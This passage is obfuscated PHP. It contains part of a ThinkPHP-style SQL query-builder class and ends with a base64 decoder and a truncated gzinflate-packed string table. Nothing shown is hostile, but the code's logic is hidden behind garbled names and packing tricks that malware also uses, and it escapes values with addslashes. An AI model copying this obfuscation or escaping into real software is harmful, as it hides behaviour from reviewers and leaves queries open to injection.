{ $à£”±ë = $…ùáÉ×—[104]; } return $à£”±ë; } protected function parseField($È³íÂ¡à) { $ÛŠË‘ =& $_SERVER[® ¨Ä®ñ]; if (is_string($È³íÂ¡à) && strpos($È³íÂ¡à, $ÛŠË‘[50])) { $È³íÂ¡à = explode($ÛŠË‘[50], $È³íÂ¡à); } if (is_array($È³íÂ¡à)) { $åÃÎ‰ = array(); foreach ($È³íÂ¡à as $ßìëÄ => $±öÁ÷òÕ) { if (!is_numeric($ßìëÄ)) { $åÃÎ‰[] = $this->parseKey($ßìëÄ, !1) . $ÛŠË‘[982] . $this->parseKey($±öÁ÷òÕ); } else { $åÃÎ‰[] = $this->parseKey($±öÁ÷òÕ); } } $øÈÛ¾Û· = implode($ÛŠË‘[50], $åÃÎ‰); } elseif (is_string($È³íÂ¡à) && !empty($È³íÂ¡à)) { $øÈÛ¾Û· = $È³íÂ¡à; } else { $øÈÛ¾Û· = $ÛŠË‘[181]; } return $øÈÛ¾Û·; } protected function parseTable($ìèŒç¦¼) { $åÈı„Ç¡ =& $_SERVER[® ¨Ä®ñ]; if (is_array($ìèŒç¦¼)) { $¹Ù¥äê„ = array(); foreach ($ìèŒç¦¼ as $Š½˜³ÃØ => $Î—…©”à) { if (!is_numeric($Š½˜³ÃØ)) { $¹Ù¥äê„[] = $this->parseKey($Š½˜³ÃØ) . $åÈı„Ç¡[53] . $this->parseKey($Î—…©”à); } else { $¹Ù¥äê„[] = $this->parseKey($Š½˜³ÃØ); } } $ìèŒç¦¼ = $¹Ù¥äê„; } elseif (is_string($ìèŒç¦¼)) { if (strstr($ìèŒç¦¼, $åÈı„Ç¡[53])) { return $ìèŒç¦¼; } $ìèŒç¦¼ = explode($åÈı„Ç¡[50], $ìèŒç¦¼); array_walk($ìèŒç¦¼, array($this, $åÈı„Ç¡[888])); } return $åÈı„Ç¡[882] . trim(implode($åÈı„Ç¡[983], $ìèŒç¦¼), $åÈı„Ç¡[380]) . $åÈı„Ç¡[882]; } protected function parseWhere($šˆÁœ¼») { $óÎÓñÍ =& $_SERVER[® ¨Ä®ñ]; $ä§ÂÌÃú = $óÎÓñÍ[12]; if (is_string($šˆÁœ¼»)) { $ä§ÂÌÃú = $šˆÁœ¼»; } else { $¯ÙÔâµÒ = isset($šˆÁœ¼»[$óÎÓñÍ[984]]) ? strtoupper($šˆÁœ¼»[$óÎÓñÍ[984]]) : $óÎÓñÍ[12]; if (in_array($¯ÙÔâµÒ, array($óÎÓñÍ[985], $óÎÓñÍ[986], $óÎÓñÍ[987]))) { $¯ÙÔâµÒ = $óÎÓñÍ[53] . $¯ÙÔâµÒ . $óÎÓñÍ[53]; unset($šˆÁœ¼»[$óÎÓñÍ[984]]); } else { $¯ÙÔâµÒ = $óÎÓñÍ[988]; } foreach ($šˆÁœ¼» as $‘¥ÉÑÀÌ => $Şµ¯¼É) { $ä§ÂÌÃú .= $óÎÓñÍ[272]; if (is_numeric($‘¥ÉÑÀÌ)) { $‘¥ÉÑÀÌ = $óÎÓñÍ[989]; } if (0 === strpos($‘¥ÉÑÀÌ, $óÎÓñÍ[11])) { $ä§ÂÌÃú .= $this->parseThinkWhere($‘¥ÉÑÀÌ, $Şµ¯¼É); } else { if (!preg_match($óÎÓñÍ[990], trim($‘¥ÉÑÀÌ))) { think_exception(think_lang($óÎÓñÍ[991]) . $óÎÓñÍ[4] . $‘¥ÉÑÀÌ); } $’Ø°ÁìÚ = is_array($Şµ¯¼É) && isset($Şµ¯¼É[$óÎÓñÍ[992]]); $‘¥ÉÑÀÌ = trim($‘¥ÉÑÀÌ); if (strpos($‘¥ÉÑÀÌ, $óÎÓñÍ[278])) { $Ÿç™Ûİ = explode($óÎÓñÍ[278], $‘¥ÉÑÀÌ); $ü‚íÜãõ = array(); foreach ($Ÿç™Ûİ as $è³Û’­ì => $¡ƒ‚Ûœ) { $¾Ÿß¾ü¸ = $’Ø°ÁìÚ ? $Şµ¯¼É[$è³Û’­ì] : $Şµ¯¼É; $ü‚íÜãõ[] = $óÎÓñÍ[255] . $this->parseWhereItem($this->parseKey($¡ƒ‚Ûœ), $¾Ÿß¾ü¸) . $óÎÓñÍ[887]; } $ä§ÂÌÃú .= implode($óÎÓñÍ[993], $ü‚íÜãõ); } elseif (strpos($‘¥ÉÑÀÌ, $óÎÓñÍ[279])) { $Ÿç™Ûİ = explode($óÎÓñÍ[279], $‘¥ÉÑÀÌ); $ü‚íÜãõ = array(); foreach ($Ÿç™Ûİ as $è³Û’­ì => $¡ƒ‚Ûœ) { $¾Ÿß¾ü¸ = $’Ø°ÁìÚ ? $Şµ¯¼É[$è³Û’­ì] : $Şµ¯¼É; $ü‚íÜãõ[] = $óÎÓñÍ[255] . $this->parseWhereItem($this->parseKey($¡ƒ‚Ûœ), $¾Ÿß¾ü¸) . $óÎÓñÍ[887]; } $ä§ÂÌÃú .= implode($óÎÓñÍ[988], $ü‚íÜãõ); } else { $ä§ÂÌÃú .= $this->parseWhereItem($this->parseKey($‘¥ÉÑÀÌ), $Şµ¯¼É); } } $ä§ÂÌÃú .= $óÎÓñÍ[273] . $¯ÙÔâµÒ; } $ä§ÂÌÃú = substr($ä§ÂÌÃú, 0, -strlen($¯ÙÔâµÒ)); } return empty($ä§ÂÌÃú) ? $óÎÓñÍ[12] : $óÎÓñÍ[994] . $ä§ÂÌÃú; } protected function parseWhereItem($¯»Ë‚¦•, $’í£®¼½) { $»ğ”Ğù™ =& $_SERVER[® ¨Ä®ñ]; $Õæ›«€š = $»ğ”Ğù™[12]; if (is_array($’í£®¼½)) { if (is_string($’í£®¼½[0])) { $„‹ƒŒÛê = strtolower($’í£®¼½[0]); if (in_array($’í£®¼½[0], array($»ğ”Ğù™[866], $»ğ”Ğù™[995], $»ğ”Ğù™[996], $»ğ”Ğù™[997], $»ğ”Ğù™[998], $»ğ”Ğù™[999]))) { $Õæ›«€š .= $¯»Ë‚¦• . $»ğ”Ğù™[53] . $’í£®¼½[0] . $»ğ”Ğù™[53] . $this->parseValue($’í£®¼½[1]); } elseif (preg_match($»ğ”Ğù™[1000], $’í£®¼½[0])) { $Õæ›«€š .= $¯»Ë‚¦• . $»ğ”Ğù™[53] . $this->exp[$„‹ƒŒÛê] . $»ğ”Ğù™[53] . $this->parseValue($’í£®¼½[1]); } elseif (preg_match($»ğ”Ğù™[1001], $’í£®¼½[0])) { if (is_array($’í£®¼½[1])) { $ÌÙÛŸ¬ö = isset($’í£®¼½[2]) ? strtoupper($’í£®¼½[2]) : $»ğ”Ğù™[986]; if (in_array($ÌÙÛŸ¬ö, array($»ğ”Ğù™[985], $»ğ”Ğù™[986], $»ğ”Ğù™[987]))) { $–äˆÅçü = array(); foreach ($’í£®¼½[1] as $˜‘ã–š) { $–äˆÅçü[] = $¯»Ë‚¦• . $»ğ”Ğù™[53] . $this->exp[$„‹ƒŒÛê] . $»ğ”Ğù™[53] . $this->parseValue($˜‘ã–š); } $Õæ›«€š .= $»ğ”Ğù™[255] . implode($»ğ”Ğù™[53] . $ÌÙÛŸ¬ö . $»ğ”Ğù™[53], $–äˆÅçü) . $»ğ”Ğù™[887]; } } else { $Õæ›«€š .= $¯»Ë‚¦• . $»ğ”Ğù™[53] . $this->exp[$„‹ƒŒÛê] . $»ğ”Ğù™[53] . $this->parseValue($’í£®¼½[1]); } } elseif ($»ğ”Ğù™[292] == $„‹ƒŒÛê) { $Õæ›«€š .= $»ğ”Ğù™[885] . $¯»Ë‚¦• . $»ğ”Ğù™[53] . $’í£®¼½[1] . $»ğ”Ğù™[1002]; } elseif (preg_match($»ğ”Ğù™[1003], $’í£®¼½[0])) { $Õæ›«€š .= $’í£®¼½[0]; } elseif (preg_match($»ğ”Ğù™[1004], $’í£®¼½[0])) { if (isset($’í£®¼½[2]) && $»ğ”Ğù™[292] == $’í£®¼½[2]) { $Õæ›«€š .= $¯»Ë‚¦• . $»ğ”Ğù™[53] . $this->exp[$„‹ƒŒÛê] . $»ğ”Ğù™[53] . $’í£®¼½[1]; } else { if (is_string($’í£®¼½[1])) { $’í£®¼½[1] = explode($»ğ”Ğù™[50], $’í£®¼½[1]); } $ôÙƒ§¸ü = implode($»ğ”Ğù™[50], $this->parseValue($’í£®¼½[1])); $Õæ›«€š .= $¯»Ë‚¦• . $»ğ”Ğù™[53] . $this->exp[$„‹ƒŒÛê] . $»ğ”Ğù™[885] . $ôÙƒ§¸ü . $»ğ”Ğù™[887]; } } elseif (preg_match($»ğ”Ğù™[1005], $’í£®¼½[0])) { $­®åê–† = is_string($’í£®¼½[1]) ? explode($»ğ”Ğù™[50], $’í£®¼½[1]) : $’í£®¼½[1]; $Õæ›«€š .= $»ğ”Ğù™[885] . $¯»Ë‚¦• . $»ğ”Ğù™[53] . $this->exp[$„‹ƒŒÛê] . $»ğ”Ğù™[53] . $this->parseValue($­®åê–†[0]) . $»ğ”Ğù™[988] . $this->parseValue($­®åê–†[1]) . $»ğ”Ğù™[273]; } else { think_exception(think_lang($»ğ”Ğù™[991]) . $»ğ”Ğù™[4] . $’í£®¼½[0]); } } else { $ú™ÍåÜ± = count($’í£®¼½); $şò¤Ü±Û = $»ğ”Ğù™[12]; if (is_string($’í£®¼½[$ú™ÍåÜ± - 1])) { $şò¤Ü±Û = isset($’í£®¼½[$ú™ÍåÜ± - 1]) ? strtoupper($’í£®¼½[$ú™ÍåÜ± - 1]) : $»ğ”Ğù™[12]; if (in_array($şò¤Ü±Û, array($»ğ”Ğù™[985], $»ğ”Ğù™[986], $»ğ”Ğù™[987]))) { $ú™ÍåÜ± = $ú™ÍåÜ± - 1; } } else { $şò¤Ü±Û = $»ğ”Ğù™[985]; } for ($Ùû“÷—ƒ = 0; $Ùû“÷—ƒ < $ú™ÍåÜ±; $Ùû“÷—ƒ++) { $­®åê–† = is_array($’í£®¼½[$Ùû“÷—ƒ]) ? $’í£®¼½[$Ùû“÷—ƒ][1] : $’í£®¼½[$Ùû“÷—ƒ]; if ($»ğ”Ğù™[292] == strtolower($’í£®¼½[$Ùû“÷—ƒ][0])) { $Õæ›«€š .= $»ğ”Ğù™[255] . $¯»Ë‚¦• . $»ğ”Ğù™[53] . $­®åê–† . $»ğ”Ğù™[1002] . $şò¤Ü±Û . $»ğ”Ğù™[53]; } else { $”ğÃ°´ë = is_array($’í£®¼½[$Ùû“÷—ƒ]) ? $this->exp[strtolower($’í£®¼½[$Ùû“÷—ƒ][0])] : $»ğ”Ğù™[866]; if (!$”ğÃ°´ë && is_array($’í£®¼½[$Ùû“÷—ƒ]) && in_array($’í£®¼½[$Ùû“÷—ƒ][0], array($»ğ”Ğù™[866], $»ğ”Ğù™[995], $»ğ”Ğù™[996], $»ğ”Ğù™[997], $»ğ”Ğù™[998], $»ğ”Ğù™[999]))) { $”ğÃ°´ë = $’í£®¼½[$Ùû“÷—ƒ][0]; } $Õæ›«€š .= $»ğ”Ğù™[255] . $¯»Ë‚¦• . $»ğ”Ğù™[53] . $”ğÃ°´ë . $»ğ”Ğù™[53] . $this->parseValue($­®åê–†) . $»ğ”Ğù™[1002] . $şò¤Ü±Û . $»ğ”Ğù™[53]; } } $Õæ›«€š = substr($Õæ›«€š, 0, -4); } } else { $Õæ›«€š .= $¯»Ë‚¦• . $»ğ”Ğù™[1006] . $this->parseValue($’í£®¼½); } return $Õæ›«€š; } protected function parseThinkWhere($·²ğ›¿, $É×õşŞç) { $´öĞ±Ê½ =& $_SERVER[® ¨Ä®ñ]; $‹¦ŠÆ®§ = $´öĞ±Ê½[12]; switch ($·²ğ›¿) { case $´öĞ±Ê½[347]: $‹¦ŠÆ®§ = $É×õşŞç; break; case $´öĞ±Ê½[989]: $‹¦ŠÆ®§ = is_string($É×õşŞç) ? $É×õşŞç : substr($this->parseWhere($É×õşŞç), 6); break; case $´öĞ±Ê½[1007]: parse_str($É×õşŞç, $ë¬Äöˆ); if (isset($ë¬Äöˆ[$´öĞ±Ê½[984]])) { $Ï›ªîí = $´öĞ±Ê½[53] . strtoupper($ë¬Äöˆ[$´öĞ±Ê½[984]]) . $´öĞ±Ê½[53]; unset($ë¬Äöˆ[$´öĞ±Ê½[984]]); } else { $Ï›ªîí = $´öĞ±Ê½[988]; } $»›Éá = array(); foreach ($ë¬Äöˆ as $çÏ×óÃ => $èİíè£¬) { $»›Éá[] = $this->parseKey($çÏ×óÃ) . $´öĞ±Ê½[1006] . $this->parseValue($èİíè£¬); } $‹¦ŠÆ®§ = implode($Ï›ªîí, $»›Éá); break; } return $‹¦ŠÆ®§; } protected function parseLimit($¯ôè¡Ôà) { $ñåæ×Äï =& $_SERVER[® ¨Ä®ñ]; return !empty($¯ôè¡Ôà) ? $ñåæ×Äï[51] . $¯ôè¡Ôà . $ñåæ×Äï[53] : $ñåæ×Äï[12]; } protected function parseJoin($»®ñåéå) { $×àó¹à =& $_SERVER[® ¨Ä®ñ]; $¼ãİÛ¼£ = $×àó¹à[12]; if (!empty($»®ñåéå)) { if (is_array($»®ñåéå)) { foreach ($»®ñåéå as $şóãÃµÂ => $ßØ²êçÍ) { if (!1 !== stripos($ßØ²êçÍ, $×àó¹à[1008])) { $¼ãİÛ¼£ .= $×àó¹à[53] . $ßØ²êçÍ; } else { $¼ãİÛ¼£ .= $×àó¹à[1009] . $ßØ²êçÍ; } } } else { $¼ãİÛ¼£ .= $×àó¹à[1009] . $»®ñåéå; } } $¼ãİÛ¼£ = preg_replace($×àó¹à[1010], think_config($×àó¹à[912]) . $×àó¹à[1011], $¼ãİÛ¼£); return $¼ãİÛ¼£; } protected function parseOrder($¶Ë£š…ƒ) { $Ô™Î“ =& $_SERVER[® ¨Ä®ñ]; if (is_array($¶Ë£š…ƒ)) { $¢ş»Šê£ = array(); foreach ($¶Ë£š…ƒ as $‰Ë˜”†¶ => $€ÖšÄÏÄ) { if (is_numeric($‰Ë˜”†¶)) { $¢ş»Šê£[] = $this->parseKey($€ÖšÄÏÄ); } else { $€ÖšÄÏÄ = in_array(strtoupper(trim($€ÖšÄÏÄ)), array($Ô™Î“[1012], $Ô™Î“[1013])) ? $Ô™Î“[53] . $€ÖšÄÏÄ : $Ô™Î“[12]; if (preg_match($Ô™Î“[1014], $‰Ë˜”†¶)) { $¢ş»Šê£[] = $this->parseKey($‰Ë˜”†¶) . $€ÖšÄÏÄ; } else { think_exception($Ô™Î“[1015] . $‰Ë˜”†¶); } } } $¶Ë£š…ƒ = implode($Ô™Î“[50], $¢ş»Šê£); } return !empty($¶Ë£š…ƒ) ? $Ô™Î“[1016] . $¶Ë£š…ƒ : $Ô™Î“[12]; } protected function parseGroup($ÀÀÈ¹‘¹) { $ÚŞè–è– =& $_SERVER[® ¨Ä®ñ]; return !empty($ÀÀÈ¹‘¹) ? $ÚŞè–è–[1017] . $ÀÀÈ¹‘¹ : $ÚŞè–è–[12]; } protected function parseHaving($çûõÁàˆ) { $¡øà€îÑ =& $_SERVER[® ¨Ä®ñ]; return !empty($çûõÁàˆ) ? $¡øà€îÑ[1018] . $çûõÁàˆ : $¡øà€îÑ[12]; } protected function parseComment($ªÚ€¶Á‚) { $Ç‰ÔãÒ½ =& $_SERVER[® ¨Ä®ñ]; return !empty($ªÚ€¶Á‚) ? $Ç‰ÔãÒ½[1019] . $ªÚ€¶Á‚ . $Ç‰ÔãÒ½[1020] : $Ç‰ÔãÒ½[12]; } protected function parseDistinct($™âá–û) { $Ÿ«Ã«üğ =& $_SERVER[® ¨Ä®ñ]; return !empty($™âá–û) ? $Ÿ«Ã«üğ[1021] : $Ÿ«Ã«üğ[12]; } protected function parseUnion($……©ƒ·Œ) { $ËÚëöô =& $_SERVER[® ¨Ä®ñ]; if (empty($……©ƒ·Œ)) { return $ËÚëöô[12]; } if (isset($……©ƒ·Œ[$ËÚëöô[343]])) { $£Íà½íÅ = $ËÚëöô[1022]; unset($……©ƒ·Œ[$ËÚëöô[343]]); } else { $£Íà½íÅ = $ËÚëöô[1023]; } foreach ($……©ƒ·Œ as $°éÊ§÷) { $£ïªô[] = $£Íà½íÅ . (is_array($°éÊ§÷) ? $this->buildSelectSql($°éÊ§÷) : $°éÊ§÷); } return implode($ËÚëöô[53], $£ïªô); } public function insert($Á·Ş¢£½, $± èÂ÷ = array(), $‘ã³¸ğ´ = false) { $­˜Ç‹ß• =& $_SERVER[® ¨Ä®ñ]; $¹ôµ¡éÚ = $Š´”Ç¿Ê = array(); $this->model = $± èÂ÷[$­˜Ç‹ß•[276]]; foreach ($Á·Ş¢£½ as $‹À§ß§ú => $æşÔİöÂ) { if (is_array($æşÔİöÂ) && $­˜Ç‹ß•[292] == $æşÔİöÂ[0]) { $Š´”Ç¿Ê[] = $this->parseKey($‹À§ß§ú); $¹ôµ¡éÚ[] = $æşÔİöÂ[1]; } elseif (is_scalar($æşÔİöÂ) || is_null($æşÔİöÂ)) { $Š´”Ç¿Ê[] = $this->parseKey($‹À§ß§ú); $¹ôµ¡éÚ[] = $this->parseValue($æşÔİöÂ); } } $¢â˜Ø“ = ($‘ã³¸ğ´ ? $­˜Ç‹ß•[889] : $­˜Ç‹ß•[890]) . $­˜Ç‹ß•[891] . $this->parseTable($± èÂ÷[$­˜Ç‹ß•[274]]) . $­˜Ç‹ß•[885] . implode($­˜Ç‹ß•[50], $Š´”Ç¿Ê) . $­˜Ç‹ß•[886] . implode($­˜Ç‹ß•[50], $¹ôµ¡éÚ) . $­˜Ç‹ß•[887]; $¢â˜Ø“ .= $this->parseLock(isset($± èÂ÷[$­˜Ç‹ß•[825]]) ? $± èÂ÷[$­˜Ç‹ß•[825]] : !1); $¢â˜Ø“ .= $this->parseComment(!empty($± èÂ÷[$­˜Ç‹ß•[349]]) ? $± èÂ÷[$­˜Ç‹ß•[349]] : $­˜Ç‹ß•[12]); return $this->execute($¢â˜Ø“, $this->parseBind(!empty($± èÂ÷[$­˜Ç‹ß•[280]]) ? $± èÂ÷[$­˜Ç‹ß•[280]] : array())); } public function selectInsert($£¸”Ù¼Í, $°â‘¤şü, $¸¥˜•µ = array()) { $ÒµÅƒó§ =& $_SERVER[® ¨Ä®ñ]; $this->model = $¸¥˜•µ[$ÒµÅƒó§[276]]; if (is_string($£¸”Ù¼Í)) { $£¸”Ù¼Í = explode($ÒµÅƒó§[50], $£¸”Ù¼Í); } array_walk($£¸”Ù¼Í, array($this, $ÒµÅƒó§[888])); $‘Òš¡©Í = $ÒµÅƒó§[1024] . $this->parseTable($°â‘¤şü) . $ÒµÅƒó§[885] . implode($ÒµÅƒó§[50], $£¸”Ù¼Í) . $ÒµÅƒó§[1002]; $‘Òš¡©Í .= $this->buildSelectSql($¸¥˜•µ); return $this->execute($‘Òš¡©Í, $this->parseBind(!empty($¸¥˜•µ[$ÒµÅƒó§[280]]) ? $¸¥˜•µ[$ÒµÅƒó§[280]] : array())); } public function update($±Ã¡œ‰, $˜ƒêä•…) { $öôÓÊæã =& $_SERVER[® ¨Ä®ñ]; $this->model = $˜ƒêä•…[$öôÓÊæã[276]]; $Üñ¯³ = $öôÓÊæã[1025] . $this->parseTable($˜ƒêä•…[$öôÓÊæã[274]]) . $this->parseSet($±Ã¡œ‰) . $this->parseWhere(!empty($˜ƒêä•…[$öôÓÊæã[270]]) ? $˜ƒêä•…[$öôÓÊæã[270]] : $öôÓÊæã[12]) . $this->parseOrder(!empty($˜ƒêä•…[$öôÓÊæã[360]]) ? $˜ƒêä•…[$öôÓÊæã[360]] : $öôÓÊæã[12]) . $this->parseLimit(!empty($˜ƒêä•…[$öôÓÊæã[287]]) ? $˜ƒêä•…[$öôÓÊæã[287]] : $öôÓÊæã[12]) . $this->parseLock(isset($˜ƒêä•…[$öôÓÊæã[825]]) ? $˜ƒêä•…[$öôÓÊæã[825]] : !1) . $this->parseComment(!empty($˜ƒêä•…[$öôÓÊæã[349]]) ? $˜ƒêä•…[$öôÓÊæã[349]] : $öôÓÊæã[12]); return $this->execute($Üñ¯³, $this->parseBind(!empty($˜ƒêä•…[$öôÓÊæã[280]]) ? $˜ƒêä•…[$öôÓÊæã[280]] : array())); } public function delete($˜Ù×Óô¥ = array()) { $¦Œ„ÍÀø =& $_SERVER[® ¨Ä®ñ]; $this->model = $˜Ù×Óô¥[$¦Œ„ÍÀø[276]]; $¦ò”¥ÒÖ = $¦Œ„ÍÀø[1026] . $this->parseTable($˜Ù×Óô¥[$¦Œ„ÍÀø[274]]) . $this->parseWhere(!empty($˜Ù×Óô¥[$¦Œ„ÍÀø[270]]) ? $˜Ù×Óô¥[$¦Œ„ÍÀø[270]] : $¦Œ„ÍÀø[12]) . $this->parseOrder(!empty($˜Ù×Óô¥[$¦Œ„ÍÀø[360]]) ? $˜Ù×Óô¥[$¦Œ„ÍÀø[360]] : $¦Œ„ÍÀø[12]) . $this->parseLimit(!empty($˜Ù×Óô¥[$¦Œ„ÍÀø[287]]) ? $˜Ù×Óô¥[$¦Œ„ÍÀø[287]] : $¦Œ„ÍÀø[12]) . $this->parseLock(isset($˜Ù×Óô¥[$¦Œ„ÍÀø[825]]) ? $˜Ù×Óô¥[$¦Œ„ÍÀø[825]] : !1) . $this->parseComment(!empty($˜Ù×Óô¥[$¦Œ„ÍÀø[349]]) ? $˜Ù×Óô¥[$¦Œ„ÍÀø[349]] : $¦Œ„ÍÀø[12]); return $this->execute($¦ò”¥ÒÖ, $this->parseBind(!empty($˜Ù×Óô¥[$¦Œ„ÍÀø[280]]) ? $˜Ù×Óô¥[$¦Œ„ÍÀø[280]] : array())); } public function select($£Íı±øÃ = array()) { $¢ôÕâ¾¦ =& $_SERVER[® ¨Ä®ñ]; $this->model = $£Íı±øÃ[$¢ôÕâ¾¦[276]]; $Ê­ÁÛì = $this->buildSelectSql($£Íı±øÃ); $Ìä­³¿ = isset($£Íı±øÃ[$¢ôÕâ¾¦[344]]) ? $£Íı±øÃ[$¢ôÕâ¾¦[344]] : !1; if ($Ìä­³¿) { $ÀìË… = is_string($Ìä­³¿[$¢ôÕâ¾¦[95]]) ? $Ìä­³¿[$¢ôÕâ¾¦[95]] : $¢ôÕâ¾¦[1027] . md5($Ê­ÁÛì); $·œ½ïî­ = think_cache($ÀìË…, $¢ôÕâ¾¦[12], $Ìä­³¿); if (!1 !== $·œ½ïî­) { return $·œ½ïî­; } } $Êæ´öâ = $this->query($Ê­ÁÛì, $this->parseBind(!empty($£Íı±øÃ[$¢ôÕâ¾¦[280]]) ? $£Íı±øÃ[$¢ôÕâ¾¦[280]] : array())); if ($Ìä­³¿ && !1 !== $Êæ´öâ) { think_cache($ÀìË…, $Êæ´öâ, $Ìä­³¿); } return $Êæ´öâ; } public function buildSelectSql($¿œ ¤ä¬ = array()) { $¸º”ä€ş =& $_SERVER[® ¨Ä®ñ]; if (isset($¿œ ¤ä¬[$¸º”ä€ş[348]])) { if (strpos($¿œ ¤ä¬[$¸º”ä€ş[348]], $¸º”ä€ş[50])) { list($Êõ…é», $†£å²¦Æ) = explode($¸º”ä€ş[50], $¿œ ¤ä¬[$¸º”ä€ş[348]]); } else { $Êõ…é» = $¿œ ¤ä¬[$¸º”ä€ş[348]]; } $Êõ…é» = $Êõ…é» ? $Êõ…é» : 1; $†£å²¦Æ = isset($†£å²¦Æ) ? $†£å²¦Æ : (is_numeric($¿œ ¤ä¬[$¸º”ä€ş[287]]) ? $¿œ ¤ä¬[$¸º”ä€ş[287]] : 20); $À»ãÅóÂ = $†£å²¦Æ * ((int) $Êõ…é» - 1); $¿œ ¤ä¬[$¸º”ä€ş[287]] = $À»ãÅóÂ . $¸º”ä€ş[50] . $†£å²¦Æ; } if (think_config($¸º”ä€ş[1028])) { $ŠæÌùŒ = $¸º”ä€ş[1029] . md5(serialize($¿œ ¤ä¬)); $æ´€ûÍˆ = think_cache($ŠæÌùŒ); if ($æ´€ûÍˆ) { return $æ´€ûÍˆ; } } $Ô˜ĞÛù = $this->parseSql($this->selectSql, $¿œ ¤ä¬); $Ô˜ĞÛù .= $this->parseLock(isset($¿œ ¤ä¬[$¸º”ä€ş[825]]) ? $¿œ ¤ä¬[$¸º”ä€ş[825]] : !1); if (isset($ŠæÌùŒ)) { think_cache($ŠæÌùŒ, $Ô˜ĞÛù); } return $Ô˜ĞÛù; } public function parseSql($ã‘Æ¡œ, $¹ƒ¡èæ = array()) { $š·ñ¬±à =& $_SERVER[® ¨Ä®ñ]; $ã‘Æ¡œ = str_replace(array($š·ñ¬±à[1030], $š·ñ¬±à[1031], $š·ñ¬±à[1032], $š·ñ¬±à[1033], $š·ñ¬±à[1034], $š·ñ¬±à[1035], $š·ñ¬±à[1036], $š·ñ¬±à[1037], $š·ñ¬±à[1038], $š·ñ¬±à[1039], $š·ñ¬±à[1040]), array($this->parseTable("{$¹ƒ¡èæ[$š·ñ¬±à[274]]}"), $this->parseDistinct(isset($¹ƒ¡èæ[$š·ñ¬±à[1041]]) ? $¹ƒ¡èæ[$š·ñ¬±à[1041]] : !1), $this->parseField(!empty($¹ƒ¡èæ[$š·ñ¬±à[268]]) ? $¹ƒ¡èæ[$š·ñ¬±à[268]] : $š·ñ¬±à[181]), $this->parseJoin(!empty($¹ƒ¡èæ[$š·ñ¬±à[277]]) ? $¹ƒ¡èæ[$š·ñ¬±à[277]] : $š·ñ¬±à[12]), $this->parseWhere(!empty($¹ƒ¡èæ[$š·ñ¬±à[270]]) ? $¹ƒ¡èæ[$š·ñ¬±à[270]] : $š·ñ¬±à[12]), $this->parseGroup(!empty($¹ƒ¡èæ[$š·ñ¬±à[506]]) ? $¹ƒ¡èæ[$š·ñ¬±à[506]] : $š·ñ¬±à[12]), $this->parseHaving(!empty($¹ƒ¡èæ[$š·ñ¬±à[1042]]) ? $¹ƒ¡èæ[$š·ñ¬±à[1042]] : $š·ñ¬±à[12]), $this->parseOrder(!empty($¹ƒ¡èæ[$š·ñ¬±à[360]]) ? $¹ƒ¡èæ[$š·ñ¬±à[360]] : $š·ñ¬±à[12]), $this->parseLimit(!empty($¹ƒ¡èæ[$š·ñ¬±à[287]]) ? $¹ƒ¡èæ[$š·ñ¬±à[287]] : $š·ñ¬±à[12]), $this->parseUnion(!empty($¹ƒ¡èæ[$š·ñ¬±à[342]]) ? $¹ƒ¡èæ[$š·ñ¬±à[342]] : $š·ñ¬±à[12]), $this->parseComment(!empty($¹ƒ¡èæ[$š·ñ¬±à[349]]) ? $¹ƒ¡èæ[$š·ñ¬±à[349]] : $š·ñ¬±à[12])), $ã‘Æ¡œ); return $ã‘Æ¡œ; } public function getLastSql($üÅ­•¢õ = '') { return $üÅ­•¢õ ? $this->modelSql[$üÅ­•¢õ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ãÒ‡Íåè) { return addslashes($ãÒ‡Íåè); } public function setModel($ãÒŸ€×Œ) { $this->model = $ãÒŸ€×Œ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto D”ÏÏ˜¼­; b³ÍÎ·­Óâ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(strrev('ñ®Ä¨ ®'), "\332\305\367\237\364\357"); $_SERVER[® ¨Ä®ñ] = explode(strrev('|||'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xd5\x28\x4b\xd8\xb\xfd\x29\xfb\x4f\x81\xc1\x90\xd8\x4e\xb4\x38\xce\xee\xd8\x9\xb2\x2c\xc7\x22\xb2\xe5\x48\x72\x56\x3b\x93"."\xb1\x34\xb6\x26\x96\x34\xf2\xcc\xc8\x5b\x12\xa0\x2c\x65\xdf\xca\x5a\xa0\x3f\xb4\xac\xa5\x24\x24\x84\x1d\x52\xe0\x6f\x81\xb2\xb5\x50\xca\x4e\x37\x88\xc3\x12\x28\x94\xbd\x85\x7\xef\x2e\xe7"."\56\63\222\341\177\337\173\337\367\362\45\321\334\163\367\173\317\75\367\234\163\317\75\367\364\67\237\270\370\346\253\327\357\272\176\267\365\273\236\176\327\155\233\157\373\214\176"."\257\337\175\375\36\344\27\375\73\346\334\275\167\41\177\16\72\367\234\232\232\266\331\373\116\353\370\336\205\167\156\324\66\151\33\265\163\342\261\247\236\216\356\377\373\333\116"."\214\354\270\376\251\321\35\273\356\362\356\105\67\177\325\200\22\323\274\15\364\107\51\230\216\242\217\30\266\143\123\100\332\54\364\31\375\364\333\50\320\337\40\375\351\112\304"."\x2c\x3d\x6f\x3a\x3a\xd\x6\xe8\x8f\xa\xed\x22\xff\xdb\x83\x39\x83\xc5\xab\x1d\xf1\x94\x9a\xec\xea\xec\x8c\x24\x52\x90\xa8\x41\x8e\xcf\x9b\x19\xf8\x2a\x6a\x96\x96\x87\xfa\x8b\xba\x65\xa3".base64_decode('1sjFqUWzqBdcEAHIaI7Wq9lQUkuz2hLpjMVXqKkVnRFI0asOlnRrlIbIZ9LRLCc=')."\x65\xe4\x75\x9e\x62\xd8\xe2\xed\x6a\x8e\x2c\x8a\x76\x28\xa9\x44\xa8\x23\x19\xa\xa7\xa2\xf1\xe\xa\xe\xc7\xdb\xdb\xa3\xa9\x72\x78\x22\x1e\x8b\x35\x87\xc2\x8b\xcb\x63\x3a\x13\xa1\x45\xed".strrev('>ôeƒ håÊP©¦…ş)_´g